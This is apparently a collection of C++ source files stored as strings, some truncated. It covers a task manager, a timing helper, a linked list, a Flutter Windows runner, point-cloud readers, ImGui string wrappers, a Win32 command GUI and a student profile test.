tasks.size(); ++i) {\n            cout << i + 1 << \". \" << tasks[i].getName() << endl;\n        }\n        cout << \"Enter the task number to mark as completed: \";\n        int taskNumber;\n        cin >> taskNumber;\n        if (taskNumber >= 1 && taskNumber <= tasks.size()) {\n            tasks[taskNumber - 1].markCompleted();\n            cout << \"Task marked as completed!\" << endl;\n        } else {\n            cout << \"Invalid task number!\" << endl;\n        }\n    }\n\n    // Edit a task\n    void editTask() {\n        if (tasks.empty()) {\n            cout << \"No tasks to edit!\" << endl;\n            return;\n        }\n        cout << \"Tasks:\" << endl;\n        for (size_t i = 0; i < tasks.size(); ++i) {\n            cout << i + 1 << \". \" << tasks[i].getName() << endl;\n        }\n        cout << \"Enter the task number to edit: \";\n        int taskNumber;\n        cin >> taskNumber;\n        if (taskNumber >= 1 && taskNumber <= tasks.size()) {\n            Task& task = tasks[taskNumber - 1];\n            string name, description, dueDate;\n            cout << \"Enter new task name (current: \" << task.getName() << \"): \";\n            cin.ignore();\n            getline(cin, name);\n            cout << \"Enter new task description (current: \" << task.getDescription() << \"): \";\n            getline(cin, description);\n            cout << \"Enter new task due date (current: \" << task.getDueDate() << \"): \";\n            getline(cin, dueDate);\n\n            task.setName(name);\n            task.setDescription(descriptio",
    "/**\n * MIT License\n * Copyright (c) 2024 Aidan Middleton\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n * \n * The above copyright notice and this permission notice shall be included in all\n * copies or substantial portions of the Software.\n * \n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n/*\n * Author: Aidan Middleton\n * Date: July 2024\n * Description: A function to measures the execution time of a function and returns the duration in milliseconds.\n */\n#include <iostream>\n#include <chrono>\n#include <thread>\n\n/**\n * Measures the execution time of a function and returns the duration in milliseconds.\n * \n * @tparam Func Type of the function to be executed.\n * @tparam Args Types of arguments to be passed to the function.\n * @param func Function to be executed.\n * @param args Arguments to be passed to the function.\n * @return Execution time of the function in milliseconds.\n */\ntemplate<typename Func, typename... Args>\nint timeFunctionExecution(Func func, Args... args) {\n    auto start = std::chrono::high_resolution_clock::now();\n    func(args...);\n    auto end = std::chrono::high_resolution_clock::now();\n    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);\n    return duration.count();\n}\n",
    "#include <iostream>\n\ntemplate <typename T>\nclass linkedList\n{\npublic:\n    struct Node\n    {\n        Node(T Info, Node *nextPtr);\n        friend std::ostream &operator<<(std::ostream os, Node &node)\n        {\n            os << node.mInfo;\n            return os;\n        }\n        T mInfo;\n        Node *nextPtr;\n    };\n\npublic:\n    linkedList();\n    linkedList(const linkedList<T> &other);\n    ~linkedList();\n    int size() const;\n    void push_back(T value);\n    void push_front(T value);\n    void pop_back();\n    void pop_front();\n    bool empty() const;\n    Node *begin();\n    Node *end();\n    T at(int index);\n\nprivate:\n    size_t mSize;\n    Node *mfirstNode;\n};\n\ntemplate <typename T>\nlinkedList<T>::Node::Node(T Info, Node *nextPtr)\n{\n    this->mInfo = Info;\n    this->nextPtr = nextPtr;\n}\n\ntemplate <typename T>\nlinkedList<T>::linkedList()\n{\n    this->mfirstNode = nullptr;\n    this->mSize = 0;\n}\n\ntemplate <typename T>\nlinkedList<T>::linkedList(const linkedList<T> &other)\n{\n    if (this != other)\n    {\n        this->mfirstNode = nullptr;\n        this->mSize = 0;\n        linkedList<T>::Node *currentPtr = other.mfirstNode;\n        while (currentPtr != nullptr)\n        {\n            this->push_back(currentPtr);\n            currentPtr = currentPtr->nextPtr;\n        }\n    }\n}\n\ntemplate <typename T>\nlinkedList<T>::~linkedList()\n{\n    Node *currentNode = this->mfirstNode;\n    while (currentNode != nullptr)\n    {\n        Node *deleteNode = currentNode;\n        currentNode = currentNode->nextPtr;\n        delete deleteNode;\n    }\n}\n\ntemplate <typename T>\nint linkedList<T>::size() const\n{\n    return this->mSize;\n}\n\ntemplate <typename T>\nvoid linkedList<T>::push_back(T value)\n{\n    if (this->mfirstNode == nullptr)\n    {\n        this->push_front(value);\n        return;\n    }\n    this->mSize++;\n    Node *newNode = new Node(value, nullptr);\n    Node *lastNode = this->mfirstNode;\n    while (lastNode->nextPtr != nullptr)\n        lastNode = lastNode->nextPtr;\n    lastNode->nextPtr = newNode;\n}\n\ntemplate <typename T>\nvoid linkedList<T>::push_front(T value)\n{\n    Node *newNode = new Node(value, this->mfirstNode);\n    this->mfirstNode = newNode;\n    this->mSize++;\n}\n\ntemplate <typename T>\nvoid linkedList<T>::pop_back()\n{\n    if (this->empty())\n        throw std::logic_error(\"[ERROR] List is empty, can't remove any element!\\n\");\n    if (this->mfirstNode->nextPtr == nullptr)\n    {\n        this->pop_front();\n        return;\n    }\n    this->mSize--;\n    Node *lastNode = this->mfirstNode;\n    while (lastNode->nextPtr->nextPtr != nullptr)\n        lastNode = lastNode->nextPtr;\n    Node *deleteNode = lastNode->nextPtr;\n    delete deleteNode;\n}\n\ntemplate <typename T>\nvoid linkedList<T>::pop_front()\n{\n    if (this->empty())\n        throw std::logic_error(\"[ERROR] List is empty, can't remove any element!\\n\");\n    this->mSize--;\n    Node *deleteNode = this->mfirstNode;\n    this->mfirstNode = this->mfirstNode->nextPtr;\n    delete deleteNode;\n}\n\ntemplate <typename T>\nbool linkedList<T>::empty() const\n{\n    return this->mfirstNode == nullptr;\n}\n\ntemplate <typename T>\ntypename linkedList<T>::Node *linkedList<T>::begin()\n{\n    if (this->empty())\n        return nullptr;\n    return this->mfirstNode;\n}\n\ntemplate <typename T>\ntypename linkedList<T>::Node *linkedList<T>::end()\n{\n    if (this->empty())\n        return nullptr;\n    Node *lastNode = this->mfirstNode;\n    while (lastNode->nextPtr != nullptr)\n        lastNode = lastNode->nextPtr;\n    return lastNode;\n}\n\ntemplate <typename T>\nT linkedList<T>::at(int index)\n{\n    if (index < 0 || index >= this->mSize)\n        throw std::logic_error(\"[ERROR] Out of range!\\n\");\n    Node *targetNode = this->mfirstNode;\n    for (int i = 0; i < index; i++)\n        if (targetNode != nullptr)\n            targetNode = targetNode->nextPtr;\n    return targetNode->mInfo;\n}\n\nint main()\n{\n    linkedList<int> *A = new linkedList<int>();\n    A->push_back(4);\n    A->push_back(5);\n    A->push_back(44);\n    A->push_back(12);\n    A->push_back(32);\n    A->push_back(49);\n    A->push_back(6); // 4 5 44 12 32 49 6\n    A->pop_back();   // 4 5 44 12 32 49\n    A->pop_front();  // 5 44 12 32 49\n    for (int i = 0; i < A->size(); i++)\n    {\n        std::cout << A->at(i) << ' ';\n    }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"webtoon_project\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\n// Created by miguelyermo on 1/3/20.\n//\n\n#include \"handlers.hpp\"\n#include \"FileReaderFactory.hpp\"\n#include \"TxtFileReader.hpp\"\n#include <algorithm>\n#include <filesystem>\n#include <fstream>\n#include <lasreader.hpp>\n#include <queue>\n#include <random>\n\n#include \"Box.hpp\"\n\nvoid createDirectory(const fs::path& dirName)\n/**\n * This function creates a directory if it does not exist.\n * @param dirname\n * @return\n */\n{\n\tif (!fs::is_directory(dirName)) { fs::create_directories(dirName); }\n}\n\nvoid writePoints(fs::path& filename, std::vector<Lpoint>& points)\n{\n\tstd::ofstream f(filename);\n\tf << std::fixed << std::setprecision(2);\n\n\tfor (Lpoint& p : points)\n\t{\n\t\tf << p << \"\\n\";\n\t}\n\n\tf.close();\n}\n\nstd::vector<Lpoint> readPointCloudOverlap(const fs::path& filename, const Box& box, const Box& overlap)\n{\n    auto fExt = filename.extension();\n\n    FileReader_t readerType = chooseReaderType(fExt);\n\n    if (readerType == err_t || readerType == txt_t)\n    {\n        std::cout << \"Uncompatible file format\\n\";\n        exit(-1);\n    }\n\n    std::shared_ptr<FileReader> fileReader = FileReaderFactory::makeReader(readerType, filename);\n\n    std::vector<Lpoint> points = fileReader->readOverlap(box, overlap);\n\n    return points;\n}\n\nstd::vector<Lpoint> readPointCloud(const fs::path& filename)\n{\n\t// Get Input File extension\n\tauto fExt = filename.extension();\n\n\tFileReader_t readerType = chooseReaderType(fExt);\n\n\t// asdf\n\tif (readerType == err_t)\n\t{\n\t\tstd::cout << \"Uncompatible file format\\n\";\n\t\texit(-1);\n\t}\n\n\tstd::shared_ptr<FileReader> fileReader = FileReaderFactory::makeReader(readerType, filename);\n\n\tstd::vector<Lpoint> points = fileReader->read();\n\t// Decimation. Implemented here because, tbh, I don't want to implement it for each reader type.\n\tstd::cout << \"Point cloud size: \" << points.size() << \"\\n\";\n\n\treturn points;\n}\n\nPointPair getBoundingBox(const fs::path& filename)\n{\n    auto fExt = filename.extension();\n\n    FileReader_t readerType = chooseReaderType(fExt);\n\n    // TODO: support for txt files\n    if (readerType == err_t || readerType == txt_t)\n    {\n        std::cout << \"Uncompatible file format\\n\";\n        exit(-1);\n    }\n\n    std::shared_ptr<FileReader> fileReader = FileReaderFactory::makeReader(readerType, filename);\n\n    auto minMax = fileReader->getMinMax();\n\n    std::cout << \"Min: \" << minMax.first << \" Max: \" << minMax.second << \"\\n\";\n    std::cout << \"X: \" << minMax.second.getX() - minMax.first.getX();\n    std::cout << \" Y: \" << minMax.second.getY() - minMax.first.getY();\n    std::cout << \" Z: \" << minMax.second.getZ() - minMax.first.getZ() << \"\\n\";\n\n    return minMax;\n}\n\nstd::vector<PointPair> genBoxes(const PointPair& minMax, int n)\n{\n    const double epsilon = 0.000000001;\n    // FIFO (biggest is always first)\n    std::queue<PointPair> boxes;\n    // better solution to this would be not using epsilon and instead passing to\n    // isInside() some kind of option telling if that specific box shares sides with\n    // the min of the main box or not, and if it does do a <=\n    // and do a >= to everyone\n    // TODO: do this^, as current implementation is flawed\n    boxes.emplace(minMax.first - (epsilon, epsilon, epsilon), minMax.second);\n\n    for (int i = n - 1; i > 0; i--)\n    {\n        PointPair b = boxes.front();\n        boxes.pop();\n\n        // get max length and find max axis\n        double max_l = std::max({ b.second.getX() - b.first.getX(), b.second.getY() - b.first.getY() });\n        char axis = 'x';\n        if (fabs(max_l - (b.second.getY() - b.first.getY())) < epsilon) { axis = 'y'; }\n\n        // times 2 for split/3\n        bool last = i == 2 && n % 2 == 1;\n        double split = (last) ? max_l / 3.0 : max_l / 2.0;\n        int mult = (last) ? 2 : 1;\n\n        if (axis == 'x')\n        {\n            boxes.emplace(b.first, Point(b.first.getX() + split, b.second.getY(), b.second.getZ()));\n            if (last) { boxes.emplace(Point(b.first.getX() + split, b.first.getY(), b.first.getZ()), Point(b.first.getX() + mult * split, b.second.getY(), b.second.getZ())); }\n            boxes.emplace(Point(b.first.getX() + mult * split, b.first.getY(), b.first.getZ()), b.second);\n        } else\n        {\n            boxes.emplace(b.first, Point(b.second.getX(), b.first.getY() + split, b.second.getZ()));\n            if (last) { boxes.emplace(Point(b.first.getX(), b.first.getY() + split, b.first.getZ()), Point(b.second.getX(), b.first.getY() + mult * split, b.second.getZ())); }\n            boxes.emplace(Point(b.first.getX(), b.first.getY() + mult * split, b.first.getZ()), b.second);\n        }\n\n        if (last) { break; }\n    }\n\n    // convert to vector (contiguous in memory, needed for scatter)\n    std::vector<PointPair> ret;\n    while (!boxes.empty())\n    {\n        ret.emplace_back(boxes.front().first, boxes.front().second + (epsilon, epsilon, epsilon));\n        boxes.pop();\n    }\n\n    return ret;\n}\n\n// creates MPI type for points\nMPI_Datatype createPointType()\n{\n    MPI_Datatype pointType;\n    MPI_Datatype types[4] = { MPI_UNSIGN",
    "// dear imgui: wrappers for C++ standard library (STL) types (std::string, etc.)\n// This is also an example of how you may wrap your own similar types.\n\n// Changelog:\n// - v0.10: Initial version. Added InputText() / InputTextMultiline() calls with std::string\n\n// See more C++ related extension (fmt, RAII, syntaxis sugar) on Wiki:\n//   https://github.com/ocornut/imgui/wiki/Useful-Extensions#cness\n\n#include \"imgui.h\"\n#include \"imgui_stdlib.h\"\n\n// Clang warnings with -Weverything\n#if defined(__clang__)\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wsign-conversion\"    // warning: implicit conversion changes signedness\n#endif\n\nstruct InputTextCallback_UserData\n{\n    std::string*            Str;\n    ImGuiInputTextCallback  ChainCallback;\n    void*                   ChainCallbackUserData;\n};\n\nstatic int InputTextCallback(ImGuiInputTextCallbackData* data)\n{\n    InputTextCallback_UserData* user_data = (InputTextCallback_UserData*)data->UserData;\n    if (data->EventFlag == ImGuiInputTextFlags_CallbackResize)\n    {\n        // Resize string callback\n        // If for some reason we refuse the new length (BufTextLen) and/or capacity (BufSize) we need to set them back to what we want.\n        std::string* str = user_data->Str;\n        IM_ASSERT(data->Buf == str->c_str());\n        str->resize(data->BufTextLen);\n        data->Buf = (char*)str->c_str();\n    }\n    else if (user_data->ChainCallback)\n    {\n        // Forward to user callback, if any\n        data->UserData = user_data->ChainCallbackUserData;\n        return user_data->ChainCallback(data);\n    }\n    return 0;\n}\n\nbool ImGui::InputText(const char* label, std::string* str, ImGuiInputTextFlags flags, ImGuiInputTextCallback callback, void* user_data)\n{\n    IM_ASSERT((flags & ImGuiInputTextFlags_CallbackResize) == 0);\n    flags |= ImGuiInputTextFlags_CallbackResize;\n\n    InputTextCallback_UserData cb_user_data;\n    cb_user_data.Str = str;\n    cb_user_data.ChainCallback = callback;\n    cb_user_data.ChainCallbackUserData = user_data;\n    return InputText(label, (char*)str->c_str(), str->capacity() + 1, flags, InputTextCallback, &cb_user_data);\n}\n\nbool ImGui::InputTextMultiline(const char* label, std::string* str, const ImVec2& size, ImGuiInputTextFlags flags, ImGuiInputTextCallback callback, void* user_data)\n{\n    IM_ASSERT((flags & ImGuiInputTextFlags_CallbackResize) == 0);\n    flags |= ImGuiInputTextFlags_CallbackResize;\n\n    InputTextCallback_UserData cb_user_data;\n    cb_user_data.Str = str;\n    cb_user_data.ChainCallback = callback;\n    cb_user_data.ChainCallbackUserData = user_data;\n    return InputTextMultiline(label, (char*)str->c_str(), str->capacity() + 1, size, flags, InputTextCallback, &cb_user_data);\n}\n\nbool ImGui::InputTextWithHint(const char* label, const char* hint, std::string* str, ImGuiInputTextFlags flags, ImGuiInputTextCallback callback, void* user_data)\n{\n    IM_ASSERT((flags & ImGuiInputTextFlags_CallbackResize) == 0);\n    flags |= ImGuiInputTextFlags_CallbackResize;\n\n    InputTextCallback_UserData cb_user_data;\n    cb_user_data.Str = str;\n    cb_user_data.ChainCallback = callback;\n    cb_user_data.ChainCallbackUserData = user_data;\n    return InputTextWithHint(label, hint, (char*)str->c_str(), str->capacity() + 1, flags, InputTextCallback, &cb_user_data);\n}\n\n#if defined(__clang__)\n#pragma clang diagnostic pop\n#endif\n",
    "#include <windows.h>\n#include <string>\n#include <sstream>\n#include \"framework.h\"\n#include \"caracal.h\"\n\n#define MAX_LOADSTRING 100\n\n// Global Variables:\nHINSTANCE hInst;                                // current instance\nWCHAR szTitle[MAX_LOADSTRING];                  // The title bar text\nWCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name\n\n// Forward declarations of functions included in this code module:\nATOM                MyRegisterClass(HINSTANCE hInstance);\nBOOL                InitInstance(HINSTANCE, int);\nLRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);\nINT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);\n\n// Function prototype for appending text to RichTextBox\nvoid AppendTextToRichTextBox(HWND hRichTextBox, const wchar_t* text);\n\n// Function prototype for executing Python script\nstd::string ExecutePythonScript(const std::string& command);\n\n// Global variables for the controls\nHWND hTextBox;\nHWND hButton;\nHWND hRichTextBox;\nHWND hHistoryListBox;\nHWND hClearButton;\n\n// Custom font\nHFONT hFont;\n\n// Custom button procedure\nLRESULT CALLBACK ButtonProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n\tHDC hdc;\n\tPAINTSTRUCT ps;\n\tstatic HBRUSH hBrush = CreateSolidBrush(RGB(50, 50, 50));\n\tstatic HBRUSH hHoverBrush = CreateSolidBrush(RGB(70, 70, 70));\n\tstatic HBRUSH hClickBrush = CreateSolidBrush(RGB(90, 90, 90));\n\n\tswitch (message)\n\t{\n\tcase WM_MOUSEMOVE:\n\t\tTRACKMOUSEEVENT tme;\n\t\ttme.cbSize = sizeof(tme);\n\t\ttme.dwFlags = TME_LEAVE;\n\t\ttme.hwndTrack = hWnd;\n\t\tTrackMouseEvent(&tme);\n\t\tSetClassLongPtr(hWnd, GCLP_HBRBACKGROUND, (LONG_PTR)hHoverBrush);\n\t\tInvalidateRect(hWnd, NULL, TRUE);\n\t\tbreak;\n\tcase WM_LBUTTONDOWN:\n\t\tSetClassLongPtr(hWnd, GCLP_HBRBACKGROUND, (LONG_PTR)hClickBrush);\n\t\tInvalidateRect(hWnd, NULL, TRUE);\n\t\tbreak;\n\tcase WM_LBUTTONUP:\n\t\tSetClassLongPtr(hWnd, GCLP_HBRBACKGROUND, (LONG_PTR)hHoverBrush);\n\t\tInvalidateRect(hWnd, NULL, TRUE);\n\t\tbreak;\n\tcase WM_MOUSELEAVE:\n\t\tSetClassLongPtr(hWnd, GCLP_HBRBACKGROUND, (LONG_PTR)hBrush);\n\t\tInvalidateRect(hWnd, NULL, TRUE);\n\t\tbreak;\n\tcase WM_CTLCOLORBTN:\n\t\thdc = (HDC)wParam;\n\t\tSetBkColor(hdc, RGB(0, 0, 0));\n\t\tSetTextColor(hdc, RGB(211, 211, 211)); // Light grey text\n\t\treturn (LRESULT)hBrush;\n\tcase WM_CTLCOLORSTATIC:\n\t\thdc = (HDC)wParam;\n\t\tSetBkColor(hdc, RGB(0, 0, 0));\n\t\tSetTextColor(hdc, RGB(211, 211, 211)); // Light grey text\n\t\treturn (LRESULT)hBrush;\n\tcase WM_CTLCOLOREDIT:\n\t\thdc = (HDC)wParam;\n\t\tSetBkColor(hdc, RGB(0, 0, 0));\n\t\tSetTextColor(hdc, RGB(211, 211, 211)); // Light grey text\n\t\treturn (LRESULT)hBrush;\n\tcase WM_PAINT:\n\t\thdc = BeginPaint(hWnd, &ps);\n\t\t// Custom painting code here\n\t\tEndPaint(hWnd, &ps);\n\t\tbreak;\n\t}\n\treturn DefWindowProc(hWnd, message, wParam, lParam);\n}\n\nint APIENTRY wWinMain(_In_ HINSTANCE hInstance,\n\t_In_opt_ HINSTANCE hPrevInstance,\n\t_In_ LPWSTR    lpCmdLine,\n\t_In_ int       nCmdShow)\n{\n\tUNREFERENCED_PARAMETER(hPrevInstance);\n\tUNREFERENCED_PARAMETER(lpCmdLine);\n\n\t// Initialize global strings\n\tLoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);\n\tLoadStringW(hInstance, IDC_CARACAL, szWindowClass, MAX_LOADSTRING);\n\tMyRegisterClass(hInstance);\n\n\t// Perform application initialization:\n\tif (!InitInstance(hInstance, nCmdShow))\n\t{\n\t\treturn FALSE;\n\t}\n\n\tHACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_CARACAL));\n\n\tMSG msg;\n\n\t// Main message loop:\n\twhile (GetMessage(&msg, nullptr, 0, 0))\n\t{\n\t\tif (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))\n\t\t{\n\t\t\tTranslateMessage(&msg);\n\t\t\tDispatchMessage(&msg);\n\t\t}\n\t}\n\n\treturn (int)msg.wParam;\n}\n\nATOM MyRegisterClass(HINSTANCE hInstance)\n{\n\tWNDCLASSEXW wcex;\n\n\twcex.cbSize = sizeof(WNDCLASSEX);\n\n\twcex.style = CS_HREDRAW | CS_VREDRAW;\n\twcex.lpfnWndProc = WndProc;\n\twcex.cbClsExtra = 0;\n\twcex.cbWndExtra = 0;\n\twcex.hInstance = hInstance;\n\twcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_CARACAL));\n\twcex.hCursor = LoadCursor(nullptr, IDC_ARROW);\n\twcex.hbrBackground = CreateSolidBrush(RGB(30, 30, 30));\n\twcex.lpszMenuName = MAKEINTRESOURCEW(IDC_CARACAL);\n\twcex.lpszClassName = szWindowClass;\n\twcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));\n\n\treturn RegisterClassExW(&wcex);\n}\n\nBOOL InitInstance(HINSTANCE hInstance, int nCmdShow)\n{\n\thInst = hInstance; // Store instance handle in our global variable\n\n\tHWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,\n\t\tCW_USEDEFAULT, 0, 1000, 600, nullptr, nullptr, hInstance, nullptr);\n\n\tif (!hWnd)\n\t{\n\t\treturn FALSE;\n\t}\n\n\tShowWindow(hWnd, nCmdShow);\n\tUpdateWindow(hWnd);\n\n\t// Create custom font\n\thFont = CreateFontW(\n\t\t20, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,\n\t\tDEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,\n\t\tDEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L\"Segoe UI\");\n\n\treturn TRUE;\n}\n\nLRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n\tswitch (message)\n\t{\n\tcase WM_CREATE:\n\t\t// Create the TextBox for inputting commands\n\t\thTextBox = CreateWindowW(\n\t\t\tL\"EDIT\",\n\t\t\tL\"\",\n\t\t\tWS_CHILD | WS_VISIBLE | WS_BORDER | ES_LEFT | ES_AUT",
    " #include <iostream>\n #include <windows.h> // WinApi header - needed for setting console color\n #include <random>\n\n #include \"Profile.h\"\n\n using std::cout;\n using std::endl;\n\n #define GREEN 2\n #define DARK_RED 4\n #define YELLOW 6\n #define LIGHT_BLUE 9\n #define LIGHT_GREEN 10\n #define TEAL 11\n #define RED 12\n #define PURPLE 13\n #define LIGHT_YELLOW 14\n #define WHITE 15\n\n\n std::string posts[] = { \"Hello world!\",\n \t\t\t\t\t\t\"Good morning :)\",\n \t\t\t\t\t\t\"Magshimim forever ***\" ,\n \t\t\t\t\t\t\"Ekronot is the best...\",\n \t\t\t\t\t\t\"Happy birthday! Ad 120\" };\n\n std::string statusMessages[] =\n { \"Feeling sick, need chicken soup... can you bring me some?\",\n \"Which witch watched which watch??? you must tell me!!!\",\n \"Finally got my driver license !!!, when are you getting yours?\",\n \"\\\"No matter how smart you are, you can never convince someone stupid that they are stupid.\\\"\",\n \"Have you ever wondered why you can't taste your tongue?\" };\n\n void set_console_color(unsigned int color)\n {\n \t// colors are 0=black 1=blue 2=green and so on to 15=white\n \t// colorattribute = foreground + background * 16\n \t// to get red text on yellow use 4 + 14*16 = 228\n \t// light red on yellow would be 12 + 14*16 = 236\n \t// a Dev-C++ tested console application by vegaseat 07nov2004\n\n \tHANDLE hConsole;\n\n \thConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n \tSetConsoleTextAttribute(hConsole, color);\n }\n\n // gets a random number between a range of numbers\n int getRandomInt(int min, int max)\n {\n \tstd::random_device rd;     // only used once to initialise (seed) engine\n \tstd::mt19937 rng(rd());    // random-number engine used (Mersenne-Twister in this case)\n \tstd::uniform_int_distribution<int> uni(min, max); // guaranteed unbiased\n\n \tauto random_integer = uni(rng);\n \treturn random_integer;\n }\n\n std::string getDeviceTypeString(const DeviceType type)\n {\n \tif (type == PC)\n \t\treturn \"PC\";\n \telse if (type == LAPTOP)\n \t\treturn \"Laptop\";\n \telse if (type == TABLET)\n \t\treturn \"Tablet\";\n \telse if (type == PHONE)\n \t\treturn \"Phone\";\n \treturn \"Unknown\";\n }\n\n std::string getDeviceString(const Device& device)\n {\n \treturn\n \t\t\"[ID: \" + std::to_string(device.getID()) +\n \t\t\", Type: \" + getDeviceTypeString(device.getType()) +\n \t\t\", OS: \" + device.getOS() +\n \t\t\", Activated: \" + (device.isActive() ? \"Yes\" : \"No\") + \"]\";\n }\n\n std::string getUserString(const User& user)\n {\n \treturn\n \t\t\"[ID: \" + std::to_string(user.getID()) +\n \t\t\", Username: \" + user.getUserName() +\n \t\t\", Age: \" + std::to_string(user.getAge()) +\n \t\t\", All devices On: \" + (user.checkIfDevicesAreOn() ? \"Yes\" : \"No\") + \"]\";\n }\n\n std::string getUserDevicesString(User& user)\n {\n \tstd::string result = \"\";\n \tDevicesList userDevices = user.getDevices();\n \tDeviceNode* device = userDevices.get_first();\n \tfor (; device != nullptr; device = device->get_next())\n \t{\n \t\tresult += getDeviceString(device->get_data());\n \t\tresult += \"\\n\";\n \t}\n \tif (result != \"\")\n \t{\n \t\t// removes the '\\n' at the end of the string\n \t\tresult = result.substr(0, result.length() - 1);\n \t}\n \treturn result;\n }\n\n std::string getProfileString(const Profile& profile)\n {\n \treturn\n \t\t\"Owner: \" + getUserString(profile.getOwner()) + \"\\n\" +\n \t\tprofile.getOwner().getUserName() + \"'s page:\\n\" +\n \t\tprofile.getPage();\n }\n\n void allFriends(Profile* profiles[], const int numOfProfiles)\n {\n \tfor (unsigned int i = 0; i < numOfProfiles; i++)\n \t{\n \t\tfor (unsigned int j = 0; j < numOfProfiles; j++)\n \t\t{\n \t\t\tif (j != i)\n \t\t\t{\n \t\t\t\tprofiles[i]->addFriend(profiles[j]->getOwner());\n \t\t\t}\n \t\t}\n \t}\n }\n\n void generateRandomPage(Profile& profile)\n {\n \tstd::string status = statusMessages[getRandomInt(0, 4)];\n \tprofile.setStatus(status);\n\n \tint numberOfPosts = getRandomInt(0, 3);\n \tstd::string post;\n \tfor (unsigned int i = 0; i < numberOfPosts; i++)\n \t{\n \t\tpost = posts[getRandomInt(0, 4)];\n \t\tprofile.addPostToProfilePage(post);\n \t}\n }\n\n\n bool test3Profile()\n {\n \tbool result = false;\n\n \ttry\n \t{\n \t\t// Tests Ex2 part 3 - Profile\n \t\tset_console_color(LIGHT_BLUE);\n \t\tcout <<\n \t\t\t\"*******************\\n\" <<\n \t\t\t\"Test 3 - Profile\t\t\t\t\\n\" <<\n \t\t\t\"*******************\\n\" << endl;\n\n \t\tset_console_color(WHITE);\n \t\tcout <<\n \t\t\t\"Initializing 12 Devices: ... \\n\" << endl;\n\n \t\tDevice device1;\n \t\tdevice1.init(2123, LAPTOP, WINDOWS11);\n\n \t\tDevice device2;\n \t\tdevice2.init(3212, PC, UbuntuOS);\n\n \t\tDevice device3;\n \t\tdevice3.init(1121, TABLET, WINDOWS10);\n\n \t\tDevice device4;\n \t\tdevice4.init(4134, PHONE, ANDROID);\n\n \t\tDevice device5;\n \t\tdevice5.init(5522, LAPTOP, MacOS);\n\n \t\tDevice device6;\n \t\tdevice6.init(5361, PC, WINDOWS7);\n\n \t\tDevice device7;\n \t\tdevice7.init(6611, PHONE, IOS);\n\n \t\tDevice device8;\n \t\tdevice8.init(6613, LAPTOP, RedHatOS);\n\n \t\tDevice device9;\n \t\tdevice9.init(7711, TABLET, WINDOWS11);\n\n \t\tDevice device10;\n \t\tdevice10.init(8181, TABLET, ANDROID);\n\n \t\tDevice device11;\n \t\tdevice11.init(8654, LAPTOP, UbuntuOS);\n\n \t\tDevice device12;\n \t\tdevice12.init(9444, PC, WINDOWS11);\n\n \t\tcout <<\n \t\t\t\"Initializing 6 Users: ... \\n\" << endl;\n\n \t\tUser user1;\n \t\tuser1.init(123456789, \"Gal\", 17);\n \t\tUser user2;\n \t\tuser2.init(987654",
